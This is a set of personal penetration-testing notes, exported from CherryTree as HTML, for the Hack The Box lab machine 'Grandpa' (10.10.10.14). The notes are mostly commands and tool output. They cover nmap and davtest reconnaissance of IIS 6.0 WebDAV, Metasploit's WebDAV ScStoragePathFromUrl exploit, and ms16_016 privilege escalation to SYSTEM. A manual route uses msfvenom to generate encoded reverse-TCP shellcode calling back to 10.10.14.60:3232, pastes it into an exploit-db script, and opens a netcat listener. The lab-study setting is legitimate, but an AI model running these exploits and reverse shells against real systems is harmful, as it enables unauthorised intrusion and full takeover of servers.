<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.14 Grandpa</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.14 Grandpa</h1><br/>root@kali:~/Desktop/Machines/HTB/Grandpa# nmap -sC -sV -oN Grandpa.txt 10.10.10.14<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-16 23:06 EDT<br />Nmap scan report for 10.10.10.14<br />Host is up (0.44s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS httpd 6.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH<br />|_http-server-header: Microsoft-IIS/6.0<br />|_http-title: Under Construction<br />| http-webdav-scan: <br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|   Server Date: Wed, 17 Jul 2019 03:06:57 GMT<br />|   Server Type: Microsoft-IIS/6.0<br />|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK<br />|_  WebDAV type: Unkown<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 38.76 seconds<br /><br />davtest -url <a href="http://10.10.10.14">http://10.10.10.14</a><br />    all fail<br />    <br />dirbuster<br />    5 dirs (all trash)<br />    <br />davtest -url <a href="http://10.10.10.14">http://10.10.10.14</a><br />######machine will break upon its own accord. if the davtest is all fails, reboot the machine.#########<br />-------------------------------------------------------------------------------------------------------------------------------------------------------<br />exploit(windows/iis/iis_webdav_scstoragepathfromurl)<br />    network service shell<br />post(multi/recon/local_exploit_suggester)<br /> [*] 10.10.10.14 - Collecting local exploits for x86/windows...<br />[*] 10.10.10.14 - 29 exploit checks are being tried...<br />[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.<br />[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.<br />[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.<br />[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.<br />&gt;&gt;&gt;&gt;[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;we are doing webdav stuff, so this is interesting<br />[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.<br />[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.<br />[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.<br />[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.<br /><br />exploit(windows/local/ms16_016_webdav)<br />starts notepad process as system<br />inject into the process<br />enjoy system shell<br />-----------------------------------------------------------------------------------------------------------------------------------------------------------<br />Without msfconsole<br />msfvenom -p windows/shell/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.60 LPORT=3232 &gt; GitShellcode.txt<br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br />#msfvenom -p windows/shell/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.60 LPORT=3232 &gt; shellcode.txt &lt;&lt;&lt;non hex (not used)<br />msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp -e x86/alpha_mixed -f python LHOST=10.10.14.60 LPORT=3232&gt; shellcodehex.txt<br />vi shellcode.hex <br />:%s/buf += //g <br />:%s/&quot;//g<br />:%s/\n//g         &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;sweet deal to get rid of the begingof the lines<br />add shellcode to  /usr/share/exploitdb/exploits/windows/remote/41738.py (copied into Grandapa dir)<br /> <br /> nc -nlvp 3232   </div></body></html>